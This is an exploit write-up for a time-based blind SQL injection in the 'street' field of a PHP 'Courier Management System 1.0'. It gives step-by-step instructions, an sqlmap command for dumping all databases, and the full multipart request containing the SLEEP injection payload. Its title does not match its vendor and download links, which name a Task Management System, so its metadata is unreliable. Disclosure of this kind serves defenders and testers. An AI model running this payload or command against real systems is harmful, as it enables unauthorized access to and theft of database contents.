# Exploit Title: Courier Management System 1.0 - 'MULTIPART street ' SQL Injection
## Exploit Author: Zhaiyi (Zeo)
## Date: 2020-12-11
## Vendor Homepage: https://www.sourcecodester.com/php/14615/task-management-system-using-phpmysqli-source-code.html
## Software Link: https://www.sourcecodester.com/download-code?nid=14615&title=Task+Management+System+using+PHP%2FMySQLi+with+Source+Code
## Affected Version: Version 1
## Category: Web Application

Step 1. Log into application with credentials

Step 2. Click on Branch

Step 3. Select New Branch http://127.0.0.1/index.php?page=new_branch

Step 4. Fill the form  , click on save

Step 5. Capture the request of the ""/ajax.php?action=save_branch"" page in burpsute

Step 6. Save request and run sqlmap on request file using command " sqlmap -r request --time-sec=5 --dbs "

Step 7. This will inject successfully and you will have an information disclosure of all databases contents


```
---
Parameter: MULTIPART street ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------12317926718649295872939507245
Content-Disposition: form-data; name="id"


-----------------------------12317926718649295872939507245
Content-Disposition: form-data; name="street"

11111111111' AND (SELECT 8687 FROM (SELECT(SLEEP(5)))XZFt) AND 'OQNu'='OQNu
-----------------------------12317926718649295872939507245
Content-Disposition: form-data; name="city"

111111111
-----------------------------12317926718649295872939507245
Content-Disposition: form-data; name="state"

1111111111
-----------------------------12317926718649295872939507245
Content-Disposition: form-data; name="zip_code"

11111111111111
-----------------------------12317926718649295872939507245
Content-Disposition: form-data; name="country"

1111111111111
-----------------------------12317926718649295872939507245
Content-Disposition: form-data; name="contact"

111111111
-----------------------------12317926718649295872939507245--
---
```


![image-20201214111450137](https://gitee.com/godzeo/blogimg/raw/master/img/20201214111450.png)
